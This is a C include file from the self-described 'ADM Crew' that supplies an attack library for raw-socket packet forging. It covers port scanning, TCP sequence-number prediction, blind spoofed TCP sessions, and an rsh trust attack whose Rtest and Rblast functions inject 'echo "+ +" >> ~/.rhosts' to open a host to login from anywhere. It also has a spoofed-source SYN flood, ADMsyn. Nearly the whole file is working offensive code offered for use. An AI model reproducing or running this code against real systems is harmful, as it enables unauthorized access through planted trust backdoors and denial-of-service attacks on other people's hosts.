/************************************************************************/
/*  ADM spoofing include  ver 1.4.10                                    */
/************************************************************************/
/************************************************************************/
/*                         The  ADM Crew                                */
/************************************************************************/
/* all credits goings to my luv Heike & all ppl of Darknet              */
/* 		( for a fucking better  world )                         */
/************************************************************************/
/* bug/idea/etc > ADM@c5.hakker.com					*/
/************************************************************************/

#include <memory.h>
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <strings.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <sys/wait.h>
#include <fcntl.h>
#include <sys/stat.h>
#include <netdb.h>
#include <netinet/in.h>
#include <netinet/ip.h>
#include <netinet/ip_icmp.h>
#include <netinet/ip_tcp.h>
#include <netinet/udp.h>
  
#define IPHDRSIZE     sizeof(struct iphdr  )
#define ICMPHDRSIZE   sizeof(struct icmphdr)
#define TCPHDRSIZE    sizeof(struct tcphdr )
#define PSEUDOHDRSIZE sizeof(struct pseudohdr)
#define UDPHDRSIZE    sizeof(struct udphdr)
#define GGPHDRSIZE    sizeof(struct ggphdr) 
#define ERROR -1

/*****************************************************************************/
/* structure of the pseudo header                                            */
/*****************************************************************************/

struct ggphdr { 
 u_char  type;
 u_char  un;
 u_short seq;
 };

 struct pseudohdr{
  unsigned long saddr;
  unsigned long daddr;
  char     useless;
  unsigned char protocol;
  unsigned short  leng;
   };
struct nnn{
u_long ip;
}myip;
                                                                
struct s_hdr{
__u32 s_ack:32;
__u32 s_seq:32;
__u32 s_da_ip:32;
__u32 s_ip:32;
__u16 s_sport:16;
__u16 s_dport:16;
}spoof_hdr;


int myrand()
{
 int j;
 j = 1+(int) (10000.0*rand()/(RAND_MAX+1.0));
 return(j);
}

int myrand2(int marge)
{
 int j;
 j = 1+(int) (marge*rand()/(RAND_MAX+1.0));
 return(j);
}




/*****************************************************************************/
/*
 * in_cksum --
 *  Checksum routine for Internet Protocol family headers (C Version)
 */
/*****************************************************************************/

unsigned short in_cksum(addr, len)
    u_short *addr;
    int len;
{
    register int nleft = len;
    register u_short *w = addr;
    register int sum = 0;
    u_short answer = 0;
 
    /*
     * Our algorithm is simple, using a 32 bit accumulator (sum), we add
     * sequential 16 bit words to it, and at the end, fold back all the
     * carry bits from the top 16 bits into the lower 16 bits.
     */
    while (nleft > 1)  {
        sum += *w++;
        nleft -= 2;
    }
 
    /* mop up an odd byte, if necessary */
    if (nleft == 1) {
        *(u_char *)(&answer) = *(u_char *)w ;
        sum += answer;
    }
 
    /* add back carry outs from top 16 bits to low 16 bits */
    sum = (sum >> 16) + (sum & 0xffff); /* add hi 16 to low 16 */
    sum += (sum >> 16);         /* add carry */
    answer = ~sum;              /* truncate to 16 bits */
    return(answer);
}

/****************************************************************************/
/*                  SEND A PAKET TCP !                                      */
/*
 
 usage: send_pkt(socket , ip of source , ip of dest , source port, dest port,
                 flags, seq_num, ack_num, window size , *data , size of data); 
                                                                            */
/****************************************************************************/                  


void send_pkt(s,
	     s_ip,
	     d_ip,
	     s_port,
	     d_port,
	     flags,
	     seq_num,
	     ack_num,
	     winsize,
	     data,
	     data_size)
        
        int s;
        unsigned long  s_ip;
        unsigned long  d_ip;
        unsigned short s_port;
        unsigned short d_port;
        unsigned char  flags;
        unsigned long  seq_num;
        unsigned long  ack_num;
        unsigned short winsize;
        unsigned char  *data;
        unsigned short data_size; 
        

{
   struct   sockaddr_in sin_dst;
   struct   iphdr       *ip;
   struct   tcphdr      *tcp;
   struct   pseudohdr   *pseudo;
   unsigned char        *DATA;
   unsigned char        packet[2048];
   
   ip     = (struct iphdr      *)packet;
   pseudo = ( struct pseudohdr *)(packet+IPHDRSIZE-PSEUDOHDRSIZE);
   tcp    = (struct tcphdr     *)(packet+IPHDRSIZE);
   DATA   = (unsigned char     *)(packet+IPHDRSIZE+TCPHDRSIZE);
   
   bzero(packet,sizeof(packet));                     
   memcpy(DATA,data,data_size);                                 
                                                 
	 pseudo->saddr = s_ip;
	 pseudo->daddr = d_ip;
	 pseudo->useless = 0;
	 pseudo->protocol = 6;
         pseudo->leng = htons(TCPHDRSIZE+data_size);
	                         
	tcp->th_sport = htons(s_port);
	tcp->th_seq = htonl(seq_num);
	tcp->th_ack = htonl(ack_num);
	tcp->th_off = 5;
	tcp->th_flags = flags;
	tcp->th_win = htons(winsize);
	
	tcp->th_urp = 0;     
        tcp->th_dport = htons(d_port );
        tcp->th_sum = 0;
        tcp->th_sum = in_cksum(pseudo,TCPHDRSIZE+PSEUDOHDRSIZE+data_size);
                 
        bzero(packet,IPHDRSIZE);
            
        ip->saddr    =  s_ip;
	ip->daddr    =  d_ip;
	ip->version  = 4;
	ip->ihl      = 5; 
	ip->ttl      = 245;
	ip->protocol = 6; 
	ip->tot_len  = htons(IPHDRSIZE+TCPHDRSIZE+data_size);
	ip->tos      = 0;
	ip->id       = random()%1256;
	ip->frag_off = 0;
	ip->check    = 0;
	ip->check    = in_cksum(packet,IPHDRSIZE);
        	
        sin_dst.sin_addr.s_addr = ip->daddr;
        sin_dst.sin_family = AF_INET;     
        
    if(	(sendto(s,packet,IPHDRSIZE+TCPHDRSIZE+data_size,0,
        (struct sockaddr *)&sin_dst,sizeof(struct sockaddr))) == ERROR){
         perror("sendto");
         exit(ERROR);
         }
       	

}


/*****************************************************************************/
/*                       SEND A UDP PACKET                                   */
/* usage: udp_send( socket, addr of source , addr of dest, port source ,     */
/*         port of dest, *data , size of data);                              */
/*****************************************************************************/

 void udp_send(s,
 	       s_addr,
 	       d_addr,
 	       s_port,
 	       d_port,
 	       datagram,
 	       datasize)
int s;
unsigned long  s_addr;
unsigned long  d_addr;
unsigned short s_port;
unsigned short d_port;
char           *datagram;
unsigned short datasize;

{
struct sockaddr_in sin;
struct iphdr     *ip;
struct udphdr    *udp;
unsigned char    *data;
unsigned char packet[1024];
 

  ip     = (struct iphdr     *)packet; 
  udp    = (struct udphdr    *)(packet+IPHDRSIZE);
  data   = (unsigned char    *)(packet+IPHDRSIZE+UDPHDRSIZE);
       
bzero(packet,sizeof(packet));

	udp->source  = htons(s_port); 
	udp->dest    = htons(d_port);
	udp->len     = htons(UDPHDRSIZE+datasize);
	udp->check   = 0;         

        memcpy(data,datagram,datasize);
        
        bzero(packet,IPHDRSIZE);
        
        ip->saddr    = s_addr;
        ip->daddr    = d_addr;
        ip->version  = 4;
        ip->ihl      = 5;
        ip->ttl      = 245;
        ip->id       = random()%5985;
        ip->protocol = 17;
        ip->tot_len  = htons(IPHDRSIZE + UDPHDRSIZE + datasize);
        ip->check    = 0;
        ip->check    = in_cksum((char *)packet,IPHDRSIZE);
                                                                        
                                                                        

	sin.sin_family=AF_INET;
	sin.sin_addr.s_addr=d_addr;
	sin.sin_port=udp->dest;

    if( (sendto(s, packet, IPHDRSIZE+UDPHDRSIZE+datasize, 0, 
        (struct sockaddr*)&sin, sizeof(struct sockaddr))) == ERROR){
        perror("sendto");
        exit(ERROR);
        }

}


/****************************************************************************/
/*                     SEND A ICMP PACKET                                   */
/*    hehe ripped from ADMscan2 :)                                          */
/****************************************************************************/
/* IN TEST !!!!!!!

int icmp_echo(int s,unsigned long int src, unsigned long int dest,int id,int seq,
		char* data, unsigned short datasize) 
{
struct iphdr   *ip;
struct icmphdr *icmp;
unsigned char *icmpdata;
unsigned char *packet;
struct sockaddr_in sin_dst;
int n;

	packet = (char*)malloc(IPHDRSIZE +ICMPHDRSIZE+datasize+1);
	
	if (packet == NULL) {
		puts("malloc error");
		return -1;
	}
	
	ip = (struct iphdr *)packet;
	icmp = (struct icmphdr *)(packet+IPHDRSIZE);
	icmpdata = (char *)(packet+IPHDRSIZE+ICMPHDRSIZE);

	ip->saddr    = src;
	ip->daddr    = dest;
	ip->version  = 4;
	ip->ihl      = 5;
	ip->ttl      = 255;
	ip->protocol = 1;
	ip->tot_len  = htons(IPHDRSIZE +ICMPHDRSIZE+datasize);
	ip->tos      = 0;
	ip->id       = 0;
	ip->frag_off = 0;
	ip->check    = 0;
	ip->check    = in_cksum(ip,IPHDRSIZE);

	icmp->type   = 8;
	icmp->code   = 0;
	icmp->checksum = 0;
	icmp->un.echo.id  = id;
	icmp->un.echo.sequence = seq;
	memcpy(icmpdata,data,datasize);
	icmp->checksum = in_cksum(icmp,ICMPHDRSIZE+datasize);

	sin_dst.sin_addr.s_addr = ip->daddr;
	sin_dst.sin_family = AF_INET;

	n=sendto(s,packet,IPHDRSIZE+ICMPHDRSIZE+datasize,0,
		(struct sockaddr*)&sin_dst,sizeof(struct sockaddr));
	if (n==-1) puts("sendto error");
	free(packet);

}
 
*/

/****************************************************************************/
/*                SEND A GGP ECHO packet                                    */
/****************************************************************************/

 void ggp_send(s,
 	       s_addr,
 	       d_addr)
int s;
unsigned long  s_addr;
unsigned long  d_addr;

{
struct sockaddr_in sin;
char packet[1024];
struct  iphdr    *ip;
struct  ggphdr   *ggp;
bzero(packet,sizeof(packet)); 

  ip     = (struct iphdr     *)packet; 
  ggp    = (struct ggphdr    *)(packet+IPHDRSIZE);
 
       
bzero(packet,sizeof(packet));

	ggp->type  = 8;
        
        bzero(packet,IPHDRSIZE);
        
        ip->saddr    = s_addr;
        ip->daddr    = d_addr;
        ip->version  = 4;
        ip->ihl      = 5;
        ip->ttl      = 245;
        ip->id       = random()%5985;
        ip->protocol = 3;
        ip->tot_len  = htons(IPHDRSIZE + GGPHDRSIZE );
        ip->check    = 0;
        ip->check    = in_cksum((char *)packet,IPHDRSIZE);
                                                                        
                                                                        

	sin.sin_family = AF_INET;
	sin.sin_addr.s_addr = d_addr;


    if( (sendto(s, packet, IPHDRSIZE+GGPHDRSIZE, 0, 
        (struct sockaddr*)&sin, sizeof(struct sockaddr))) == ERROR){
        perror("sendto");
        exit(ERROR);
        }

}


/****************************************************************************/
/*                TEST IF  A HOST IS ALIVE                                  */
/*                                                                          */
/****************************************************************************/ 

/*****************************************************************************/
/*                     RECV PAKET                                            */
/* get_pkt(socket, *buffer , size of the buffer);                            */
/*****************************************************************************/
int get_pkt(s, data, size)

int s;
unsigned char *data;
int size;

{
 struct sockaddr_in sin;
 int len,resu;
 len = sizeof(sin);
 resu = recvfrom(s,data,size,0,(struct sockaddr *)&sin,&len);
 return resu;
}        
     
/*****************************************************************************/
/*                     GET THE SEQ NUMBER                                    */
/*****************************************************************************/

unsigned long get_seq(s_ip,d_ip,s_port)

unsigned long  s_ip; 
unsigned long  d_ip;
unsigned short s_port;

{
struct   tcphdr       *tcp;
struct   iphdr        *ip;

unsigned char         data[400];
         int          i = 1;
         int          timeout = 0;
         int          s, s_r, S_port;
         
unsigned long         ack_num = 0;

ip  = (struct iphdr  *)data;
tcp = (struct tcphdr *)(data+IPHDRSIZE);

bzero(data,sizeof(data));

S_port = random()%1000;

if ( (s   = socket(AF_INET,SOCK_RAW,IPPROTO_RAW)) == ERROR) {
   perror("socket");
   exit(ERROR);
   }
   
if ( (s_r = socket(AF_INET,SOCK_RAW,IPPROTO_TCP)) == ERROR) {
  perror("socket");
  exit(ERROR);
  }
  
 if( (fcntl(s_r,F_SETFL,O_NONBLOCK)) == ERROR ){
     perror("fcntl");
     exit(ERROR);
     }      
  
 
  if( (fcntl(s,F_SETFL,O_NONBLOCK)) == ERROR ){
     perror("fcntl");
     exit(ERROR);
     }      


if ( (setsockopt(s, IPPROTO_IP, IP_HDRINCL, (char *)&i, sizeof(i))) == ERROR) {
  perror("ioctl");
  exit(ERROR);
  }
 

send_pkt(s,s_ip,d_ip,S_port,s_port,TH_SYN,1234,0,512,NULL,0);

while (timeout < 480) {
    get_pkt(s_r,data,sizeof(data));
     
                if (ip->saddr==d_ip)
   	          if (tcp->th_dport == htons(S_port))
        	    if (tcp->th_sport == htons(s_port))
                      if (tcp->th_flags & TH_ACK)
                	   {                         
                            printf(" SeQ numa Is %lu \n" , ntohl(tcp->th_seq));
                            ack_num = ntohl(tcp->th_seq);
                            break;
                           } 
          usleep(10000);
          timeout++;
          }
close(s);
close(s_r);
return(ack_num);
} 

/*****************************************************************************/
/*                     PORT PROBER                                           */
/* usage:  pprobe(ip of desti , port ,flagz )                                */        
/*****************************************************************************/

int pprobe(da_ip,port,flagz)

unsigned long da_ip; 
unsigned short port;
         int flagz;
{
struct   tcphdr       *tcp;
struct   iphdr        *ip,*ipr;
unsigned char         data[400];
unsigned char         datar[400];
int s,i = 1, s_r, resu = -1,timeout = 0,sicmp;

ip  = (struct iphdr  *)data;
tcp = (struct tcphdr *)(data+IPHDRSIZE);
ipr = (struct iphdr *)data;

bzero(data,sizeof(data));

if ( (s=socket(AF_INET,SOCK_RAW,IPPROTO_RAW)) == ERROR) {
  perror("socket");
  exit(ERROR);
  }
  
if ( (s_r=socket(AF_INET,SOCK_RAW,IPPROTO_TCP)) == ERROR) {
  perror("socket");
  exit(ERROR);
  }
  
if ( (sicmp=socket(AF_INET,SOCK_RAW,IPPROTO_ICMP)) == ERROR) {
  perror("socket");
  exit(ERROR);
  }
 
 if( (fcntl(s_r,F_SETFL,O_NONBLOCK)) == ERROR ){
     perror("fcntl");
     exit(ERROR);
     }      
 
  if( (fcntl(sicmp,F_SETFL,O_NONBLOCK)) == ERROR ){
     perror("fcntl");
     exit(ERROR);
     }      



if ( (setsockopt(s, IPPROTO_IP, IP_HDRINCL, (char *)&i, sizeof(i))) == ERROR) {
 perror("setsockopt");
 exit(ERROR);
 }

send_pkt(s,myip.ip,da_ip,2669,port,flagz,1234,0,512,NULL,0);

while ( timeout < 80) {

	data[0]  = '0';
	datar[0] = '0';

	usleep(100000);

	timeout = timeout + 1;

	get_pkt(s_r,data,399);
	get_pkt(sicmp,datar,399);

	if ( datar[0] != '0') {	                       
        resu = -1;
        printf("ICMP!\n");
        return(resu);
        }

 if (data[0] != '0')
   if (ip->saddr == da_ip)
     if (tcp->th_dport == htons(2669))               
        if (tcp->th_sport == htons(port))
             {
              resu = (tcp->th_flags |  TH_ACK);
              if (resu == 18)resu = 0;    
              if (resu == 20)resu = -1;
              break;   
             }
     
 } /* end of the while loop */


if (timeout > 79) printf(" Time Out");

close(s);
close(s_r);
close(sicmp);
return(resu);
}          

/****************************************************************************/
/* pprobeS ( ip victim, flagz,FILE filez, port limit)                       */
/****************************************************************************/

int pprobeS(unsigned long da_ip, 
       int flagz,FILE *filez ,u_int limit)
{
struct   tcphdr       *tcp;
struct   iphdr        *ip,*ipr;
unsigned char         data[400];
int     s, i=1, s_r, resu =-1;
u_long  lim;


bzero(data,sizeof(data));

ip  = (struct iphdr  *)data;
tcp = (struct tcphdr *)(data+IPHDRSIZE);
ipr = (struct iphdr *)data;


if ( (s   =  socket(AF_INET,SOCK_RAW,IPPROTO_RAW)) == ERROR) {
  perror("socket");
  exit(ERROR);
  }
   
if ( (s_r =  socket(AF_INET,SOCK_RAW,IPPROTO_TCP)) == ERROR) {
  perror("socket");
  exit(ERROR);
  }
  
if ( (setsockopt(s, IPPROTO_IP, IP_HDRINCL, (char *)&i, sizeof(i))) == ERROR) {
 perror("setsockopt");
 exit(ERROR);
 }

while ( lim < limit)
  {
  send_pkt(s,myip.ip,da_ip,2669,lim,flagz,1234,0,512,NULL,0);
  
  data[0] = '0';
  get_pkt(s_r, data, sizeof(data));
         
     if ( data[0] != '0')
       if ( ip->saddr == da_ip )
         if ( tcp->th_dport == htons(2669) )
            if ( tcp->th_sport != htons(2669) ) {           
                         resu = (tcp->th_flags |  TH_ACK);
                          	if ( resu == 18) {
                         	   printf("le port %i est ouvert !\n",ntohs(tcp->th_sport));
                     	 	   fprintf(filez,"%i\n",ntohs(tcp->th_sport));
                     	           fflush(filez); 
                      	           goto fin;
                                 }          				                          
               } 
    fin:
    lim++;
  }    /* end of  while loop */

close(s);
close(s_r);
return resu ;
}          



                                                                               
/****************************************************************************/
/*                       UDP PORT PROBBER                                   */
/* usage: Upprobe( ip of dest , port)                                       */
/****************************************************************************/

int Upprobe(unsigned long da_ip, unsigned short int port )

{
struct   sockaddr_in  sin_dst;
struct   icmphdr      *icmp;
struct   iphdr        *ip;
unsigned char         data[400];
int      s, i=1, s_r, resu, time=0;

ip  = (struct iphdr  *)data;
icmp = (struct icmphdr*)(data+IPHDRSIZE);

bzero(data,sizeof(data));

/* SOCK_DGRAM INIT */

if ( (s = socket(AF_INET,SOCK_DGRAM,IPPROTO_UDP)) == ERROR) {
  perror("socket");
  exit(ERROR);
  }
  
  
 if( (fcntl(s,F_SETFL,O_NONBLOCK)) == ERROR ){
     perror("fcntl");
     exit(ERROR);
     }      
 

sin_dst.sin_family = AF_INET;
sin_dst.sin_port = htons(port);
sin_dst.sin_addr.s_addr = da_ip;

sendto(s,NULL,0,0,(struct sockaddr *)&sin_dst,sizeof(sin_dst));

/* SOCK_RAW FOR LISTEN ICMP */

if ( (s_r = socket(AF_INET,SOCK_RAW,IPPROTO_ICMP)) == ERROR) {
   perror("socket");
   exit(ERROR);
  }

 
 if (( fcntl(s_r,F_SETFL,O_NONBLOCK)) == ERROR ) {
     perror("fcntl");
     exit(ERROR);
     
     }      

          
resu = -1;  

while ( time < 200)
{
 data[0] = '0';
 
 get_pkt(s_r, data, sizeof(data));
 
 if ( data[0] != '0' )  
   if ( ip->saddr == da_ip )
     if ( ip->protocol == 1 )return(-1);     
 else time++;   
 }
return(0);
} 
         
/****************************************************************************/
/*                     MakE A sPOoF ConnEction                              */
/*                                                                          */
/* usage(socket,sourceIP,Destination IP ,port SOurce, port Dest,ipofurhost) */
/****************************************************************************/

int Sconnect(int s,
         unsigned long  s_ip,
         unsigned long  d_ip,
         unsigned short int s_port,
         unsigned short int d_port,
         unsigned long   myhost)

{ 

int    loop;
spoof_hdr.s_seq   = 1;
spoof_hdr.s_da_ip = d_ip;
spoof_hdr.s_ip    = s_ip;
spoof_hdr.s_sport = s_port;
spoof_hdr.s_dport = d_port;

spoof_hdr.s_ack = get_seq(myhost,d_ip,d_port);

if ( spoof_hdr.s_ack == 0 ) {
	printf(" Too SLoww \n");
	return(ERROR);
	}

send_pkt(s,s_ip,d_ip,s_port,d_port,TH_SYN,spoof_hdr.s_seq,1,512,NULL,0);

 for ( loop = 1; loop < 8; loop++)
 {  
  spoof_hdr.s_seq = spoof_hdr.s_seq;
  printf(" spoof ack +64000*%i+1 =%u \n",loop,spoof_hdr.s_ack+(64000*loop)+1);
  send_pkt(s, s_ip ,d_ip ,s_port,d_port,TH_ACK,spoof_hdr.s_seq+1,spoof_hdr.s_ack+(64000*loop)+1,14360,NULL,0); 
 }
 
spoof_hdr.s_seq = spoof_hdr.s_seq+1;
return(0);
}
/*****************************************************************************/
/*               Spoofed Write  ( need Sconnect before )                     */
/* usage:  Swrite (socket, *data , sizeofdata );                                    */
/*****************************************************************************/


void Swrite(int s, u_char *data, int size )

{
int loop;

for ( loop=1; loop < 8; loop++) {

send_pkt(s,spoof_hdr.s_ip,spoof_hdr.s_da_ip ,
           spoof_hdr.s_sport,spoof_hdr.s_dport,
           (TH_PUSH|TH_ACK),spoof_hdr.s_seq,spoof_hdr.s_ack+(64000*loop)+1,
           14360,data,size);
  }
spoof_hdr.s_seq = spoof_hdr.s_seq+size;
}   


/****************************************************************************/
/* Spoofed write 2							    */
/* usage: Swrites(s,*data);					            */
/****************************************************************************/
void Swrites(int s, char *data)
{
	int size;
	size = strlen(data);
	Swrite(s, data, size);
}
/****************************************************************************/
/* RESET CONNEXION                                                          */
/****************************************************************************/
 
void Srst(int s)

{
int loop;

for (loop = 1; loop < 8; loop++) {

send_pkt(s,spoof_hdr.s_ip,spoof_hdr.s_da_ip ,
           spoof_hdr.s_sport,spoof_hdr.s_dport,
           TH_FIN,spoof_hdr.s_seq,spoof_hdr.s_ack+(64000*loop)+1,
           14360,NULL,0);
    }

for ( loop = 1; loop < 8; loop++)  {

send_pkt(s,spoof_hdr.s_ip,spoof_hdr.s_da_ip ,
           spoof_hdr.s_sport,spoof_hdr.s_dport,
           TH_ACK,spoof_hdr.s_seq,spoof_hdr.s_ack+(64000*loop)+1,
           14360,NULL,0);
     }

}   


/*****************************************************************************/
/*           Test If a Host Is SPoofable                                     */
/* usage: Stest (myhost,ip dest , port of dest);                             */
/*****************************************************************************/

int Stest( unsigned long myhost, unsigned long ip_d , unsigned short  d_port)
{
u_long resu;
u_long resu1;
u_long resu2;
u_long resu3;
int done = -1;


resu   = get_seq(myhost,ip_d,d_port);
resu1  = get_seq(myhost,ip_d,d_port);
resu2  = get_seq(myhost,ip_d,d_port);
resu3  = get_seq(myhost,ip_d,d_port);


if ( resu1 - resu  == 64000 || resu1-resu    == 128000 ) done = 0;

if ( resu3 - resu2 ==64000  || resu3 - resu2 == 128000)  done = 0;
 
return ( done );

}

/****************************************************************************/
/*    get only the IP frome a host -l ouput filez                           */
/* usage: IPFILEZ( *the src filez, *the output filez);                      */
/****************************************************************************/

void IPFILEZ(FILE *DA, FILE *trace)
{
  char ipz[256];
  int oki;

  while ( !feof(DA) ) {                
     int size;

     fscanf(DA , "%s", ipz);  
      
     size = strspn(ipz, "aAeEiIoOuUyYgG");
     if (size <= 0) oki = 1;

     if (oki == 1) {  
        fprintf(trace, "%s\n", ipz );
        fflush(trace);
        oki = 0;
     }
          
     if (feof(DA)) break;
        
  }

}
 
 /****************************************************************************/
 /*     make a Scan Port on a plage of port                                  */
 /*  Scan2( *int input,int*output,size of *);                                */
 /****************************************************************************/

void Scan2(int *ptr,int *outptr,int Size,int flagz , u_long da_ip)
{ 
struct   tcphdr       *tcpr;
struct   iphdr        *ipr;
unsigned char         datar[400];
int          s, i=1, s_r, resu, timeout=0, try=0, on=1, con;

ipr  = (struct iphdr *)datar;
tcpr = (struct tcphdr *)(datar+IPHDRSIZE);

bzero(outptr,(Size*sizeof(outptr)));
bzero(datar,sizeof(datar));

/* socket stuff */

if (( s = socket(AF_INET,SOCK_RAW,IPPROTO_RAW)) == ERROR) {
  perror("socket");
  exit(ERROR);
  }
  
if ( (s_r = socket(AF_INET,SOCK_RAW,IPPROTO_TCP)) == ERROR) {
  perror("socket");
  exit(ERROR);
  }

 
  if ( (fcntl(s_r,F_SETFL,O_NONBLOCK)) == ERROR ) {
     perror("fcntl");
     exit(ERROR);
     }      


if ( (setsockopt(s, IPPROTO_IP, IP_HDRINCL, (char *)&i, sizeof(i))) == ERROR) {
 perror("setsockopt");
 exit(ERROR);
 }

con = myrand ();
            
while ( timeout < 540) {

  datar[0] = '0';
  
  usleep(10000);

  timeout++;

  if ( try< Size)
      if ( *(ptr + try) != 0) 
           send_pkt(s,myip.ip,da_ip,(40000+con)-try,*(ptr+try),flagz,1234,0,512,NULL,0);
    
    
  get_pkt(s_r, datar,sizeof(datar));

  if ( datar[0] != '0')
    if (ipr->saddr == da_ip)
     if (ntohs(tcpr->th_dport) > 39000 )
        {  
        resu = (tcpr->th_flags |  TH_ACK);
             
               if ( resu == 18 ) {
                   *(outptr+((40000+con)-ntohs(tcpr->th_dport))) = 1;
	           printf(" le Port %i repond :)\n",ntohs(tcpr->th_sport));
                   resu = 0;
                   datar[0] = '0';
                }
        }     
 
   try++;
 } /* end of while loop */   
 
} 


/****************************************************************************/
/*  Rtest a function for test the permission of R service                   */
/*  Rtest(ip of victim,port);						    */
/****************************************************************************/

int Rtest(u_long ip,int port,char *Ruser,char *Luser)
{
struct sockaddr_in adresse_serveur,adresse_client;

char bla[2000];
char cmd[200];
char exe[200] = "echo \" + + \" >> ~/.rhosts";
char *cmdptr;

int socket_client, err = 0, i;
int longueur = sizeof(struct sockaddr_in);

bzero(bla,sizeof(bla));
bzero(cmd,sizeof(cmd));

cmdptr=cmd;

if (port == 514) {
	
	if ((socket_client=socket(AF_INET,SOCK_STREAM,IPPROTO_TCP)) == ERROR) {
	  perror("socket");
	  exit(ERROR);
	  }
	   
	adresse_client.sin_family=AF_INET;
	adresse_client.sin_addr.s_addr=htonl(INADDR_ANY);
	adresse_client.sin_port=htons(666);
        
        printf(" port %i\n",ntohs(adresse_client.sin_port));
    
    while (1) {    
       if ( (bind(socket_client,(struct sockaddr *)&adresse_client,longueur)) == -1 ) {
       
          i = ntohs(adresse_client.sin_port);
          i++;
         adresse_client.sin_port = htons(i);
         }
           
        else break;
      }
	adresse_serveur.sin_family=AF_INET;
	adresse_serveur.sin_port=htons(514);
	adresse_serveur.sin_addr.s_addr=ip;

	connect(socket_client,(struct sockaddr *)&adresse_serveur,longueur); 

	send( socket_client, "0\0", 2, 0);	
	strcat( cmd, Luser);
	
	send(socket_client, cmd, strlen(Luser)+1, 0);
	
	bzero(cmd,sizeof(cmd));
	
	cmdptr = cmd;
	strcat(cmdptr, Ruser);
	
	cmdptr = cmdptr + strlen(Ruser) + 1;
	strcat (cmdptr, exe);	
	
	send(socket_client, cmd, strlen(Ruser)+strlen(exe)+2, 0);
	
	read(socket_client, bla, sizeof(bla));
        
        printf("%s",bla);
	
	 if (strstr(bla,"nied") || strstr(bla,"inc") ) { 
	  close(socket_client);
	     err = -1;
	     }
	
	else err = 1;
	
   close(socket_client);
   }
return(err);

}



/****************************************************************************/
/* Rblast  a function for try the RSH spoofing                              */
/* Rblast(ip trust,ip of victim,ur ip,sport     ,local user, remote user )  */
/* ya u cant determine ur own comand for this use ADMrsh !                  */
/****************************************************************************/ 

void Rblast( u_long s_ip,
        u_long d_ip, 
        u_long my_ip, 
        int port,
        char *Luser, 
        char *Ruser)

{ 
 
 char  bla[]="echo \"+ +\" >> ~/.rhosts";
 char  cmd[512];
 int s, s_r;
 int i=1;
 char *cmdptr;

       
if ( (s_r=socket(AF_INET,SOCK_RAW,IPPROTO_TCP)) == ERROR) {
  perror("socket");
  exit(ERROR);
  }
  
if ( (s=socket(AF_INET, SOCK_RAW, IPPROTO_RAW)) == ERROR) {
  perror("socket");
  exit(ERROR);
  }
  
 if ( (setsockopt(s, IPPROTO_IP, IP_HDRINCL, (char *)&i, sizeof(i))) == ERROR) {
   perror("setsockopt");
   exit(ERROR);
   }
      
       
 
 cmdptr = cmd;
 strcat(cmdptr,"0\0");
 
 cmdptr = cmdptr+2;
 strcat(cmdptr, Luser);
 
 cmdptr = cmdptr+strlen(Luser)+1;
 strcat(cmdptr, Ruser);
 
 cmdptr = cmdptr+strlen(Ruser)+1;
 strcat(cmdptr, bla);
 
 cmdptr = cmdptr+strlen(bla)+1;
 
 printf("make spoof connection ...\n");
 
 
 printf("%s@%s --> ",Luser,inet_ntoa(s_ip));
 printf("%s@%s\n",Ruser,inet_ntoa(d_ip));   
      
 Sconnect(s,s_ip,d_ip,port,514,my_ip);
 
 printf("send the spoof rsh... \n");
 
 Swrite(s,cmd,strlen(Luser)+strlen(Ruser)+strlen(bla)+2+3);
 Srst(s); 

close(s);

}
 
/*****************************************************************************/
/* ADMsyn( ip dest , port , numba of packet                                  */
/*****************************************************************************/
  
void ADMsyn(u_long d_ip ,u_int port,int num)
{
int i = 1, s; 
u_int s_ip;

if ( (s = socket(AF_INET, SOCK_RAW, IPPROTO_RAW)) == ERROR) {
  perror("socket");
  exit(ERROR);
  }
  
if ( (setsockopt(s, IPPROTO_IP, IP_HDRINCL, (char *)&i, sizeof(i))) == ERROR) {
 perror("setsockopt");
 exit(ERROR);
 }
 
s_ip = 0x01010101;

 for ( i=0; i < num; i++)
   {
         s_ip = ntohl(s_ip);
	 s_ip++;
	 s_ip = htonl(s_ip);
 	 send_pkt(s,s_ip,d_ip ,514+i,port,TH_SYN,123,3,512,NULL,0);
    }
}


/*********************************************************************/
/* ADM tcp sampler   IN TEST !!!                                     */
/*********************************************************************/



ADMsmptcp( u_long s_ip , 
           u_long d_ip ,
           u_int port,
           u_int num 
           )
 { 
struct   tcphdr       *tcp;
struct   iphdr        *ip;
unsigned char         data[400];
         int          s, i=1, a=0, s_r, S_port;
         int          time,timeout = 480;
         int          TRY = 0;
         u_int	      SEQ = 0;
         
ip  = (struct iphdr  *)data;
tcp = (struct tcphdr *)(data+IPHDRSIZE);

bzero(data,sizeof(data));

S_port = random()%1000;

if ( ( s = socket(AF_INET,SOCK_RAW,IPPROTO_RAW)) == ERROR) {
   perror("socket");
   exit(ERROR);
  }
  
if ( (s_r = socket(AF_INET,SOCK_RAW,IPPROTO_TCP)) == ERROR){
   perror("socket");
   exit(ERROR);
  }
 
 if( (fcntl(s_r,F_SETFL,O_NONBLOCK)) == ERROR ){
     perror("fcntl");
     exit(ERROR);
    }      

  
if ( (setsockopt(s, IPPROTO_IP, IP_HDRINCL, (char *)&i, sizeof(i))) == ERROR) {
   perror("setsockopt");
   exit(ERROR);
 }

i = 0;  
while ( i < num ) {

 send_pkt(s,s_ip,d_ip ,S_port,port,TH_SYN,123,3,512,NULL,0);

 bzero(data,sizeof(data));

 while (1) {
  if (  (get_pkt(s_r, data, sizeof(data))) == -1 ) {
        
        usleep(10000); 
        time++;
        
        if (time > timeout) 
                 return(ERROR);         
       } else {           
                  if (ip->saddr == d_ip)
                    if (tcp->th_dport == htons(S_port)) 
                      if (tcp->th_sport == htons(port))
                        if ( (tcp->th_flags & TH_ACK) && (tcp->th_flags & TH_SYN)) {
                                                  
                      		printf("seq recue %lu diff %lu\n",ntohl(tcp->th_seq),ntohl(tcp->th_seq)-SEQ);
                      		SEQ = ntohl(tcp->th_seq);
                      		i++;
                      		break;
                      		}
                   }
                       
      }  /* end of while */
   }  /* end of while */ 
}        
                                                                  
                                                                                                            